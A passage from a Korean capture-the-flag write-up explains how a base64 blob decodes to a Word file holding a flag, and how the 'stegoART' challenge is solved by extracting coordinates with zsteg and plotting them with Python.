BfcmVscy8ucmVsc1BLAQItABQABgAIAAAAIQCL98yQcQEAANoFAAATAAAAAAAAAAAAAAAAAAEZAABbQ29udGVudF9UeXBlc10ueG1sUEsBAi0AFAAGAAgAAAAhAHTO0jCvAQAAkQMAABAAAAAAAAAAAAAAAAAAoxoAAGRvY1Byb3BzL2FwcC54bWxQSwUGAAAAAAwADAD/AgAAgBwAAAAA";

function base64Decode(str){
    return atob(str);
}

var decodedStr = base64Decode(encodedStr);
console.log(decodedStr)
```

크롬에서 개발자 도구(F12)를 켜 자바스크립트 코드를 실행하니 PK로 시작하는 바이너리가 출력된다. 헤더 시그니처가 출력되었기 때문에 decodedStr은 압축 파일임을 알 수 있다. 

이 출력을 파일로 저장해서 정말로 압축 파일이 맞는지 확인한다.

```py
# 파일 저장 스크립트
import base64

encodedStr = "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";
f = open("res.zip", "wb")
decodedStr = base64.b64decode(encodedStr)
f.write(decodedStr)
```

압축 파일의 파일 목록을 보면 word 파일임을 알 수 있다.

```sh
unzip -l res.zip
```

```text
Archive:  rex.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
      432  1980-01-01 00:00   [trash]/0000.dat
      433  1980-01-01 00:00   docProps/core.xml
      244  1980-01-01 00:00   word/webSettings.xml
      208  1980-01-01 00:00   word/fontTable.xml
     3391  1980-01-01 00:00   word/document.xml
     2326  1980-01-01 00:00   word/styles.xml
     7990  1980-01-01 00:00   word/theme/theme1.xml
     2222  1980-01-01 00:00   word/settings.xml
      870  1980-01-01 00:00   word/_rels/document.xml.rels
      615  1980-01-01 00:00   _rels/.rels
     1498  1980-01-01 00:00   [Content_Types].xml
      913  1980-01-01 00:00   docProps/app.xml
---------                     -------
    21142                     12 files
```

확장자를 docx로 변경하면 정상적으로 word 파일을 열리며 flag 내용을 확인할 수 있다.

`I_cant_b3li3v3_y0u_put_a_fil3_1n_a_PDF`

## 21. Misc - stegoART

문제에서 present.png 파일이 주어집니다.

zsteg라는 스테가노그래피 툴을 사용하면 png 파일에 들어있는 여러 알려진 형식의 데이터를 탐지하고 추출할 수 있습니다.

![](/assets/img/hacktheon2024/5.png)

b1,g,lsb,xy에 (x,y) 형태의 데이터 리스트가 들어있으며, -E 옵션으로 모든 데이터를 추출했습니다

![](/assets/img/hacktheon2024/6.png)

목록에 들어있는 좌표를 칠하고 이미지를 보면 플래그를 얻을 수 있습니다.

```python
from PIL import Image

img = Image.new("RGB", (600, 80), (255, 255, 255))

d = [(8,5), (8,6), ...]

for y, x in d:
    img.putpixel((x, y), (0, 0, 0))

img.show()
```

![](/assets/img/hacktheon2024/7.png)
